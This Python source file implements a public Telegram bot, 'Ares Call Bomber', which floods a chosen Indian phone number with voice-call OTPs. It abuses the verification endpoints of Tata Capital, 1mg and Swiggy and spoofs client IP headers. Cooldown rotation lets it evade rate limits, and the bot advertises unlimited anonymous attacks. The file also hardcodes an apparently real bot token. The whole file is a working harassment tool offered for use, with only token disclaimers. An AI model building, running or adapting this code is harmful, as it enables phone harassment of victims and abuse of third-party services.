# [file name]: ares_bomber_public_bot.py
import asyncio
import aiohttp
import json
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Set
import urllib.parse
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import threading
from dataclasses import dataclass, field
from enum import Enum
import time
import re
import requests
from collections import defaultdict
import hashlib

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8036186838:AAFz2V8eymqKXD3vIZcdte8ZwNUTm1fJt68"  # Replace with your bot token
# ======================================================

class ServiceStatus(Enum):
    ACTIVE = "🟢"
    COOLDOWN = "🟡"
    INACTIVE = "🔴"
    BLOCKED = "⛔"

@dataclass
class UserData:
    user_id: int
    username: Optional[str] = None
    first_name: Optional[str] = None
    last_name: Optional[str] = None
    ip_address: Optional[str] = None
    country: Optional[str] = None
    total_attacks: int = 0
    total_calls: int = 0
    join_date: datetime = field(default_factory=datetime.now)
    attacks_today: int = 0
    last_attack: Optional[datetime] = None

@dataclass
class AttackSession:
    user_id: int
    phone_number: str
    ip_address: str
    start_time: datetime = field(default_factory=datetime.now)
    total_calls: int = 0
    is_running: bool = True
    thread: Optional[threading.Thread] = None
    services_status: Dict[str, ServiceStatus] = field(default_factory=dict)
    service_stats: Dict[str, Dict] = field(default_factory=dict)

class AresBomberPublicBot:
    def __init__(self):
        self.active_attacks: Dict[str, AttackSession] = {}  # phone -> session
        self.user_data: Dict[int, UserData] = {}
        self.daily_stats = {
            'total_attacks': 0,
            'total_calls': 0,
            'unique_users': set(),
            'start_time': datetime.now()
        }
        self.service_configs = self._load_service_configs()
        
    # ==================== IP DETECTION ====================
    async def get_user_ip(self, user_id: int) -> str:
        """Get user's real IP address"""
        try:
            # Try multiple IP detection methods
            ip_services = [
                "https://api.ipify.org?format=json",
                "https://api.my-ip.io/ip.json",
                "https://ipinfo.io/json",
                "https://ip-api.com/json/"
            ]
            
            for service in ip_services:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(service, timeout=5) as response:
                            if response.status == 200:
                                data = await response.json()
                                if 'ip' in data:
                                    ip = data['ip']
                                    logger.info(f"Detected IP for user {user_id}: {ip}")
                                    return ip
                except:
                    continue
            
            # If all services fail, generate IP based on user ID
            ip_hash = hashlib.md5(str(user_id).encode()).hexdigest()
            ip_parts = [str(int(ip_hash[i:i+2], 16)) for i in range(0, 8, 2)]
            generated_ip = f"172.{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            logger.info(f"Generated IP for user {user_id}: {generated_ip}")
            return generated_ip
            
        except Exception as e:
            logger.error(f"Error detecting IP for user {user_id}: {e}")
            # Fallback IP
            return f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    async def get_ip_info(self, ip: str) -> Dict:
        """Get IP geolocation information"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}", timeout=5) as response:
                    if response.status == 200:
                        return await response.json()
        except:
            pass
        return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}
    
    # ==================== ORIGINAL BOMBING LOGIC ====================
    def _load_service_configs(self) -> List[Dict]:
        """Load service configurations (same as original)"""
        return [
            {
                "name": "Tata Capital",
                "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "method": "POST",
                "payload_template": {"phone": "{phone}", "applSource": "", "isOtpViaCallAtLogin": "true"},
                "headers_template": {
                    "Content-Type": "application/json",
                    "X-Forwarded-For": "{ip}",
                    "Client-IP": "{ip}"
                }
            },
            {
                "name": "1mg",
                "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
                "method": "POST",
                "payload_template": {"number": "{phone}", "is_corporate_user": False, "otp_on_call": True},
                "headers_template": {
                    "Host": "www.1mg.com",
                    "content-type": "application/json; charset=utf-8",
                    "accept-encoding": "gzip",
                    "user-agent": "okhttp/3.9.1",
                    "X-Forwarded-For": "{ip}",
                    "Client-IP": "{ip}"
                }
            },
            {
                "name": "Swiggy",
                "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
                "method": "POST",
                "payload_template": {"mobile": "{phone}"},
                "headers_template": {
                    "Host": "profile.swiggy.com",
                    "tracestate": "@nr=0-2-737486-14933469-25139d3d045e42ba----1692101455751",
                    "traceparent": "00-9d2eef48a5b94caea992b7a54c3449d6-25139d3d045e42ba-00",
                    "newrelic": "eyJ2IjpbMCwyXSwiZCI6eyJ0eSI6Ik1vYmlsZSIsImFjIjoiNzM3NDg2IiwiYXAiOiIxNDkzMzQ2OSIsInRyIjoiOWQyZWVmNDhhNWI5ZDYiLCJpZCI6IjI1MTM5ZDNkMDQ1ZTQyYmEiLCJ0aSI6MTY5MjEwMTQ1NTc1MX19",
                    "pl-version": "55",
                    "user-agent": "Swiggy-Android",
                    "tid": "e5fe04cb-a273-47f8-9d18-9abd33c7f7f6",
                    "sid": "8rt48da5-f9d8-4cb8-9e01-8a3b18e01f1c",
                    "version-code": "1161",
                    "app-version": "4.38.1",
                    "latitude": "0.0",
                    "longitude": "0.0",
                    "os-version": "13",
                    "accessibility_enabled": "false",
                    "swuid": "4c27ae3a76b146f3",
                    "deviceid": "4c27ae3a76b146f3",
                    "x-network-quality": "GOOD",
                    "accept-encoding": "gzip",
                    "accept": "application/json; charset=utf-8",
                    "content-type": "application/json; charset=utf-8",
                    "x-newrelic-id": "UwUAVV5VGwIEXVJRAwcO",
                    "X-Forwarded-For": "{ip}",
                    "Client-IP": "{ip}"
                }
            }
        ]
    
    async def _make_service_call(self, service_config: Dict, phone: str, ip: str) -> Dict:
        """Make actual API call to service"""
        try:
            # Prepare payload and headers
            payload = {k: (v.format(phone=phone, ip=ip) if isinstance(v, str) else v) 
                      for k, v in service_config["payload_template"].items()}
            headers = {k: (v.format(phone=phone, ip=ip) if isinstance(v, str) else v) 
                      for k, v in service_config["headers_template"].items()}
            
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession() as session:
                if service_config["method"] == "POST":
                    if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                        payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
                        headers["Content-Length"] = str(len(payload_str.encode('utf-8')))
                        
                        async with session.post(
                            service_config["endpoint"],
                            data=payload_str,
                            headers=headers,
                            timeout=timeout,
                            ssl=False
                        ) as response:
                            status = response.status
                            try:
                                text = await response.text()
                            except:
                                text = ""
                    else:
                        async with session.post(
                            service_config["endpoint"],
                            json=payload,
                            headers=headers,
                            timeout=timeout,
                            ssl=False
                        ) as response:
                            status = response.status
                            try:
                                text = await response.text()
                            except:
                                text = ""
                else:
                    return {"success": False, "error": "Unsupported method"}
                
                # Analyze response
                success = status in [200, 201]
                message = f"Status: {status}"
                
                if not success:
                    if "already" in text.lower() or "wait" in text.lower():
                        message = "Service in cooldown"
                    elif "limit" in text.lower() or "429" in text:
                        message = "Rate limited"
                
                return {
                    "success": success,
                    "status_code": status,
                    "message": message,
                    "service": service_config["name"]
                }
                
        except asyncio.TimeoutError:
            return {"success": False, "error": "Timeout", "service": service_config["name"]}
        except Exception as e:
            return {"success": False, "error": str(e), "service": service_config["name"]}
    
    async def _attack_worker(self, session: AttackSession, user_data: UserData):
        """Main attack worker (same as original script)"""
        try:
            while session.is_running:
                # Update service status
                for service in self.service_configs:
                    service_name = service["name"]
                    if service_name not in session.service_stats:
                        session.service_stats[service_name] = {
                            'success': 0,
                            'failed': 0,
                            'last_call': None,
                            'cooldown_until': None,
                            'consecutive_fails': 0
                        }
                
                # Make calls to each service
                for service in self.service_configs:
                    if not session.is_running:
                        break
                    
                    service_name = service["name"]
                    stats = session.service_stats[service_name]
                    
                    # Check cooldown
                    if stats['cooldown_until'] and datetime.now() < stats['cooldown_until']:
                        session.services_status[service_name] = ServiceStatus.COOLDOWN
                        continue
                    
                    # Make the call
                    result = await self._make_service_call(service, session.phone_number, session.ip_address)
                    
                    # Update stats
                    stats['last_call'] = datetime.now()
                    
                    if result.get("success"):
                        stats['success'] += 1
                        stats['consecutive_fails'] = 0
                        session.total_calls += 1
                        user_data.total_calls += 1
                        session.services_status[service_name] = ServiceStatus.ACTIVE
                        
                        # Set cooldown for successful call
                        cooldown = random.randint(15, 45)
                        stats['cooldown_until'] = datetime.now() + timedelta(seconds=cooldown)
                        
                    else:
                        stats['failed'] += 1
                        stats['consecutive_fails'] += 1
                        
                        if stats['consecutive_fails'] >= 3:
                            session.services_status[service_name] = ServiceStatus.BLOCKED
                            stats['cooldown_until'] = datetime.now() + timedelta(minutes=5)
                        else:
                            session.services_status[service_name] = ServiceStatus.INACTIVE
                            cooldown = random.randint(30, 90)
                            stats['cooldown_until'] = datetime.now() + timedelta(seconds=cooldown)
                    
                    # Random delay between service calls
                    await asyncio.sleep(random.uniform(1, 3))
                
                # Wait before next cycle
                await asyncio.sleep(random.uniform(5, 15))
                
        except Exception as e:
            logger.error(f"Error in attack worker: {e}")
    
    # ==================== TELEGRAM BOT HANDLERS ====================
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        
        # Register or update user
        if user.id not in self.user_data:
            # Get user IP
            user_ip = await self.get_user_ip(user.id)
            ip_info = await self.get_ip_info(user_ip)
            
            self.user_data[user.id] = UserData(
                user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name,
                ip_address=user_ip,
                country=ip_info.get('country', 'Unknown'),
                join_date=datetime.now()
            )
            
            self.daily_stats['unique_users'].add(user.id)
            logger.info(f"New user registered: {user.id} ({user.first_name}) from {ip_info.get('country')}")
        
        user_data = self.user_data[user.id]
        
        # Welcome message
        welcome_text = f"""
╔══════════════════════════════════════╗
║        🔥 *ARES CALL BOMBER* 🔥       ║
║     *Public Version v2.0*            ║
╚══════════════════════════════════════╝

👤 *Welcome, {user.first_name}!*
🆔 User ID: `{user.id}`
📍 Location: {user_data.country} ({user_data.ip_address})
📅 Joined: {user_data.join_date.strftime('%Y-%m-%d')}
📊 Your Stats: {user_data.total_attacks} attacks, {user_data.total_calls} calls

⚡ *Features:*
• Voice Call OTP
• Live Statistics
• Smart Cooldown System
• UNLIMITED Attacks

⚠️ *Disclaimer: Use responsibly. Don't spam.*
"""
        
        keyboard = [
            [InlineKeyboardButton("🎯 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("📊 MY STATS", callback_data="my_stats"),
             InlineKeyboardButton("🌎 GLOBAL STATS", callback_data="global_stats")],
            [InlineKeyboardButton("⚡ ACTIVE ATTACKS", callback_data="active_attacks"),
             InlineKeyboardButton("❓ HELP", callback_data="help")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if update.callback_query:
            await update.callback_query.edit_message_text(
                welcome_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text(
                welcome_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline button presses"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "start_attack":
            await self._request_target(query)
        elif query.data == "my_stats":
            await self._show_user_stats(query)
        elif query.data == "global_stats":
            await self._show_global_stats(query)
        elif query.data == "active_attacks":
            await self._show_active_attacks(query)
        elif query.data == "help":
            await self._show_help(query)
        elif query.data == "cancel_attack":
            await query.edit_message_text("❌ Attack cancelled.")
        elif query.data.startswith("launch_"):
            await self._launch_attack_button(query)
        elif query.data == "back_to_main":
            await self._back_to_main(query)
    
    async def _request_target(self, query):
        """Request target phone number"""
        await query.edit_message_text(
            "🎯 *ENTER TARGET PHONE NUMBER*\n\n"
            "📱 Format: `10 digits without +91`\n"
            "Example: `9876543210`\n\n"
            "⚠️ *Important:*\n"
            "• Use responsibly\n"
            "• Don't attack emergency numbers\n"
            "• Respect privacy laws\n\n"
            "Type /cancel to abort.",
            parse_mode='Markdown'
        )
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle incoming messages"""
        user = update.effective_user
        message_text = update.message.text.strip()
        
        # Check if user sent a phone number (10 digits)
        if re.match(r'^\d{10}$', message_text):
            # Get user data
            if user.id not in self.user_data:
                user_ip = await self.get_user_ip(user.id)
                ip_info = await self.get_ip_info(user_ip)
                
                self.user_data[user.id] = UserData(
                    user_id=user.id,
                    username=user.username,
                    first_name=user.first_name,
                    last_name=user.last_name,
                    ip_address=user_ip,
                    country=ip_info.get('country', 'Unknown')
                )
            
            user_data = self.user_data[user.id]
            
            # Check if already attacking this number
            if message_text in self.active_attacks:
                await update.message.reply_text(
                    f"⚠️ *ATTACK IN PROGRESS*\n\n"
                    f"Target `{message_text}` is already under attack.",
                    parse_mode='Markdown'
                )
                return
            
            # Show confirmation
            keyboard = [
                [InlineKeyboardButton("✅ LAUNCH ATTACK", callback_data=f"launch_{message_text}")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel_attack")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            confirm_text = f"""
⚡ *ATTACK CONFIRMATION*

📱 *Target:* `{message_text}`
👤 *Attacker:* {user.first_name}
📍 *Your IP:* `{user_data.ip_address}`
🌎 *Location:* {user_data.country}
🛠️ *Services:* 3 Active
🎯 *Type:* Voice Call OTP
🕒 *Start Time:* {datetime.now().strftime('%H:%M:%S')}

⚠️ *Confirm attack launch?*
            """
            
            await update.message.reply_text(
                confirm_text,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        elif message_text == "/cancel":
            await update.message.reply_text("❌ Operation cancelled.")
        else:
            # Not a phone number, check if it's a response to start_attack
            await update.message.reply_text(
                "❌ *INVALID INPUT*\n\n"
                "Please enter a 10-digit phone number.\n"
                "Example: `9876543210`\n\n"
                "Or type /cancel to abort.",
                parse_mode='Markdown'
            )
    
    async def _launch_attack_button(self, query):
        """Handle launch attack button click"""
        user = query.from_user
        phone = query.data.split("_", 1)[1]
        
        # Get user data
        if user.id not in self.user_data:
            user_ip = await self.get_user_ip(user.id)
            ip_info = await self.get_ip_info(user_ip)
            
            self.user_data[user.id] = UserData(
                user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                last_name=user.last_name,
                ip_address=user_ip,
                country=ip_info.get('country', 'Unknown')
            )
        
        user_data = self.user_data[user.id]
        
        # UNLIMITED ATTACKS - NO DAILY LIMITS
        
        # Create attack session
        session = AttackSession(
            user_id=user.id,
            phone_number=phone,
            ip_address=user_data.ip_address
        )
        
        # Initialize service status
        for service in self.service_configs:
            session.services_status[service["name"]] = ServiceStatus.ACTIVE
        
        # Start attack in background
        loop = asyncio.new_event_loop()
        thread = threading.Thread(
            target=self._run_attack_thread,
            args=(session, user_data, loop),
            daemon=True
        )
        thread.start()
        
        session.thread = thread
        self.active_attacks[phone] = session
        
        # Update user stats
        user_data.total_attacks += 1
        user_data.attacks_today += 1
        user_data.last_attack = datetime.now()
        
        # Update global stats
        self.daily_stats['total_attacks'] += 1
        
        # Send confirmation
        attack_info = self._format_attack_info(session, user_data)
        
        await query.edit_message_text(
            f"🚀 *ATTACK LAUNCHED SUCCESSFULLY!*\n\n{attack_info}",
            parse_mode='Markdown'
        )
        
        # Send periodic updates
        asyncio.create_task(self._send_attack_updates(query.message.chat_id, phone))
    
    def _run_attack_thread(self, session: AttackSession, user_data: UserData, loop: asyncio.AbstractEventLoop):
        """Run attack in separate thread"""
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._attack_worker(session, user_data))
    
    def _format_attack_info(self, session: AttackSession, user_data: UserData) -> str:
        """Format attack information for display"""
        info = f"""
📱 *Target:* `{session.phone_number}`
👤 *Attacker:* {user_data.first_name}
📍 *Attack IP:* `{session.ip_address}`
🕒 *Started:* {session.start_time.strftime('%H:%M:%S')}
📊 *Calls Made:* {session.total_calls}

*Service Status:*
"""
        
        for service_name, status in session.services_status.items():
            stats = session.service_stats.get(service_name, {})
            last_call = stats.get('last_call')
            last_call_str = last_call.strftime('%H:%M:%S') if last_call else "Never"
            success = stats.get('success', 0)
            
            info += f"{status.value} *{service_name}:*\n"
            info += f"  ├─ Success: {success}\n"
            info += f"  └─ Last Call: {last_call_str}\n"
        
        return info
    
    async def _send_attack_updates(self, chat_id: int, phone: str):
        """Send periodic updates about the attack"""
        try:
            update_count = 0
            while phone in self.active_attacks and self.active_attacks[phone].is_running:
                await asyncio.sleep(30)  # Update every 30 seconds
                
                if phone not in self.active_attacks:
                    break
                
                session = self.active_attacks[phone]
                user_data = self.user_data.get(session.user_id)
                
                if not user_data:
                    break
                
                attack_info = self._format_attack_info(session, user_data)
                
                # Send update
                from telegram import Bot
                bot = Bot(token=BOT_TOKEN)
                await bot.send_message(
                    chat_id=chat_id,
                    text=f"📡 *LIVE ATTACK UPDATE #{update_count + 1}*\n\n{attack_info}",
                    parse_mode='Markdown'
                )
                
                update_count += 1
                
                # Stop after 10 updates (5 minutes)
                if update_count >= 10:
                    break
                    
        except Exception as e:
            logger.error(f"Error sending attack updates: {e}")
    
    async def _show_user_stats(self, query):
        """Show user statistics"""
        user = query.from_user
        user_data = self.user_data.get(user.id)
        
        if not user_data:
            await query.edit_message_text("❌ No user data found. Please use /start first.")
            return
        
        stats_text = f"""
📊 *YOUR STATISTICS*

👤 *User:* {user_data.first_name}
🆔 ID: `{user_data.user_id}`
📅 Joined: {user_data.join_date.strftime('%Y-%m-%d %H:%M')}
📍 Location: {user_data.country}

📈 *Attack Stats:*
├─ Total Attacks: {user_data.total_attacks}
├─ Total Calls: {user_data.total_calls}
├─ Today's Attacks: {user_data.attacks_today}
└─ Last Attack: {user_data.last_attack.strftime('%H:%M:%S') if user_data.last_attack else 'Never'}

⚡ *Account Type:* UNLIMITED
📱 *Your IP:* `{user_data.ip_address}`
"""
        
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=reply_markup)
    
    async def _show_global_stats(self, query):
        """Show global statistics"""
        total_users = len(self.user_data)
        active_attacks = len([a for a in self.active_attacks.values() if a.is_running])
        total_calls_today = sum(u.total_calls for u in self.user_data.values())
        
        # Top attackers
        top_attackers = sorted(self.user_data.values(), key=lambda x: x.total_attacks, reverse=True)[:5]
        top_attacker_text = "\n".join(
            f"{i+1}. {u.first_name}: {u.total_attacks} attacks" 
            for i, u in enumerate(top_attackers)
        )
        
        stats_text = f"""
🌎 *GLOBAL STATISTICS*

📅 *Today's Stats ({datetime.now().strftime('%Y-%m-%d')}):*
├─ Total Attacks: {self.daily_stats['total_attacks']}
├─ Total Calls: {total_calls_today}
├─ Active Users: {len(self.daily_stats['unique_users'])}
└─ Active Attacks: {active_attacks}

👥 *All-Time Stats:*
├─ Total Users: {total_users}
├─ Total Attacks: {sum(u.total_attacks for u in self.user_data.values())}
└─ Total Calls: {sum(u.total_calls for u in self.user_data.values())}

🏆 *TOP ATTACKERS:*
{top_attacker_text}

🕒 *System Uptime:* {self._format_duration(self.daily_stats['start_time'])}
"""
        
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=reply_markup)
    
    async def _show_active_attacks(self, query):
        """Show active attacks"""
        active_sessions = [a for a in self.active_attacks.values() if a.is_running]
        
        if not active_sessions:
            await query.edit_message_text("⚡ *NO ACTIVE ATTACKS*\n\nNo attacks are currently running.")
            return
        
        attacks_text = "⚡ *ACTIVE ATTACKS*\n\n"
        
        for i, session in enumerate(active_sessions[:10], 1):  # Show first 10
            user_data = self.user_data.get(session.user_id)
            username = user_data.first_name if user_data else f"User {session.user_id}"
            duration = self._format_duration(session.start_time)
            
            attacks_text += f"{i}. 📱 `{session.phone_number}`\n"
            attacks_text += f"   ├─ By: {username}\n"
            attacks_text += f"   ├─ Duration: {duration}\n"
            attacks_text += f"   ├─ Calls: {session.total_calls}\n"
            attacks_text += f"   └─ IP: `{session.ip_address}`\n\n"
        
        if len(active_sessions) > 10:
            attacks_text += f"... and {len(active_sessions) - 10} more attacks"
        
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(attacks_text, parse_mode='Markdown', reply_markup=reply_markup)
    
    async def _show_help(self, query):
        """Show help information"""
        help_text = """
❓ *ARES BOMBER - HELP*

⚡ *How to Use:*
1. Click "START ATTACK"
2. Enter target phone number (10 digits)
3. Confirm the attack
4. Monitor progress with live updates


🛡️ *Your Privacy:*
• Anonymous attacks

⚖️ *Rules:*
• UNLIMITED attacks for all users
• Don't attack emergency numbers
• Respect local laws

🔧 *Commands:*
/start - Main menu
/stats - Your statistics  
/status - Active attacks
/stop [number] - Stop attack
/help - This help message

⚠️ *Disclaimer: Use responsibly!*
"""
        
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=reply_markup)
    
    async def _back_to_main(self, query):
        """Handle back to main button"""
        user = query.from_user
        
        if user.id not in self.user_data:
            await query.edit_message_text("Please use /start first.")
            return
        
        user_data = self.user_data[user.id]
        
        welcome_text = f"""
╔══════════════════════════════════════╗
║        🔥 *ARES CALL BOMBER* 🔥       ║
║     *Public Version v2.0*            ║
╚══════════════════════════════════════╝

👤 *Welcome back, {user.first_name}!*
🆔 User ID: `{user.id}`
📍 Location: {user_data.country}
📊 Your Stats: {user_data.total_attacks} attacks, {user_data.total_calls} calls

⚡ *Features:*
• Voice Call OTP
• Live Statistics
• Smart Cooldown System
• UNLIMITED Attacks

⚠️ *Disclaimer: Use responsibly. Don't spam.*
"""
        
        keyboard = [
            [InlineKeyboardButton("🎯 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("📊 MY STATS", callback_data="my_stats"),
             InlineKeyboardButton("🌎 GLOBAL STATS", callback_data="global_stats")],
            [InlineKeyboardButton("⚡ ACTIVE ATTACKS", callback_data="active_attacks"),
             InlineKeyboardButton("❓ HELP", callback_data="help")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            welcome_text,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stop command"""
        user = update.effective_user
        
        if not context.args:
            await update.message.reply_text(
                "❌ *Usage:* /stop [phone_number]\n"
                "Example: /stop 9876543210",
                parse_mode='Markdown'
            )
            return
        
        phone = context.args[0]
        
        if phone not in self.active_attacks:
            await update.message.reply_text(
                f"⚠️ *NOT FOUND*\n\n"
                f"No active attack for `{phone}`",
                parse_mode='Markdown'
            )
            return
        
        # Check if user owns this attack
        session = self.active_attacks[phone]
        if session.user_id != user.id:
            await update.message.reply_text(
                "🚫 *ACCESS DENIED*\n\n"
                "You can only stop your own attacks.",
                parse_mode='Markdown'
            )
            return
        
        # Stop the attack
        session.is_running = False
        duration = self._format_duration(session.start_time)
        
        # Remove from active attacks
        del self.active_attacks[phone]
        
        await update.message.reply_text(
            f"🛑 *ATTACK STOPPED*\n\n"
            f"📱 Target: `{phone}`\n"
            f"⏱️ Duration: {duration}\n"
            f"📊 Total Calls: {session.total_calls}\n\n"
            f"✅ Attack terminated successfully.",
            parse_mode='Markdown'
        )
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        active_sessions = [a for a in self.active_attacks.values() if a.is_running]
        
        if not active_sessions:
            await update.message.reply_text("⚡ *NO ACTIVE ATTACKS*\n\nNo attacks are currently running.")
            return
        
        attacks_text = "⚡ *ACTIVE ATTACKS*\n\n"
        
        for session in active_sessions:
            user_data = self.user_data.get(session.user_id)
            username = user_data.first_name if user_data else f"User {session.user_id}"
            duration = self._format_duration(session.start_time)
            
            attacks_text += f"📱 `{session.phone_number}`\n"
            attacks_text += f"├─ By: {username}\n"
            attacks_text += f"├─ Duration: {duration}\n"
            attacks_text += f"├─ Calls: {session.total_calls}\n"
            
            # Show service status
            active_services = sum(1 for s in session.services_status.values() 
                                if s in [ServiceStatus.ACTIVE, ServiceStatus.COOLDOWN])
            attacks_text += f"└─ Services: {active_services}/3 active\n\n"
        
        await update.message.reply_text(attacks_text, parse_mode='Markdown')
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        user = update.effective_user
        user_data = self.user_data.get(user.id)
        
        if not user_data:
            await update.message.reply_text("❌ No user data found. Please use /start first.")
            return
        
        stats_text = f"""
📊 *YOUR STATISTICS*

👤 User: {user_data.first_name}
📅 Joined: {user_data.join_date.strftime('%Y-%m-%d')}
📍 Location: {user_data.country}

📈 Attack Stats:
├─ Total Attacks: {user_data.total_attacks}
├─ Total Calls: {user_data.total_calls}
├─ Today's Attacks: {user_data.attacks_today}
└─ Last Attack: {user_data.last_attack.strftime('%H:%M:%S') if user_data.last_attack else 'Never'}

📱 Your IP: `{user_data.ip_address}`
"""
        
        await update.message.reply_text(stats_text, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = """
❓ *ARES BOMBER - HELP*

⚡ *How to Use:*
1. Use /start to begin
2. Click "START ATTACK"
3. Enter 10-digit phone number
4. Confirm and launch attack


🔧 *Commands:*
/start - Main menu
/stats - Your statistics  
/status - Active attacks
/stop [number] - Stop attack
/help - This help message

⚠️ *Disclaimer: Use responsibly! Don't attack emergency numbers.*
"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    def _format_duration(self, start_time: datetime) -> str:
        """Format duration for display"""
        duration = datetime.now() - start_time
        hours, remainder = divmod(int(duration.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        if hours > 0:
            return f"{hours}h {minutes}m"
        elif minutes > 0:
            return f"{minutes}m {seconds}s"
        else:
            return f"{seconds}s"

def main():
    """Start the bot"""
    # Create bot instance
    bot = AresBomberPublicBot()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Store bot instance in bot data
    application.bot_data['ares_bot'] = bot
    
    # Add command handlers
    application.add_handler(CommandHandler("start", bot.start_command))
    application.add_handler(CommandHandler("stop", bot.stop_command))
    application.add_handler(CommandHandler("status", bot.status_command))
    application.add_handler(CommandHandler("stats", bot.stats_command))
    application.add_handler(CommandHandler("help", bot.help_command))
    
    # Add callback query handler for ALL buttons
    application.add_handler(CallbackQueryHandler(bot.button_handler))
    
    # Add message handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    
    # Start the bot
    print("""
╔══════════════════════════════════════╗
║        🔥 ARES CALL BOMBER 🔥         ║
║        Public Bot v2.0               ║
║        Starting...                    ║
╚══════════════════════════════════════╝
    """)
    print(f"🕒 Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("⚡ Bot is running. Press Ctrl+C to stop.")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
